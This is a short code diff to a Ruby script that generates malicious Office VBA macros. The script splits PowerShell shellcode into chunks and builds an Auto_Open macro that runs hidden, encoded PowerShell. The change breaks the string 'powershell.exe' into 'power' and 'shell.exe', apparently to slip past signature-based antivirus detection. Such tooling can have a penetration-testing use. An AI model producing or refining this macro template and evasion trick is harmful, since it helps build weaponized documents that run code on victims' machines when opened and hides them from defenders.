@@ -123,7 +123,7 @@ def prep_PS_chunk(ps_shellcode)
     splitup = ps_shellcode.scan(/.{1,254}/)
 
     stringCommands=""
-    varFinal="stringFinal=stringA+"
+    varFinal="stringFinal=stringA+stringB+"
 
     splitup = splitup.flatten  #make the 2-dimensional array 1-dimensional to easier iterate
     splitup.each_with_index do |val, index|   #cycle through the array and create the strings for VBA
@@ -164,7 +164,8 @@ if $lencode == "vba"
 #final VBA template
 vbaTEMPLATE = %{Sub Auto_Open()
 
-stringA = "powershell.exe -NoE -NoP -NonI -W Hidden -E "
+stringA = "power"
+stringB = "shell.exe -NoE -NoP -NonI -W Hidden -E "
             
 #{prepped_powershell_encoded}
 
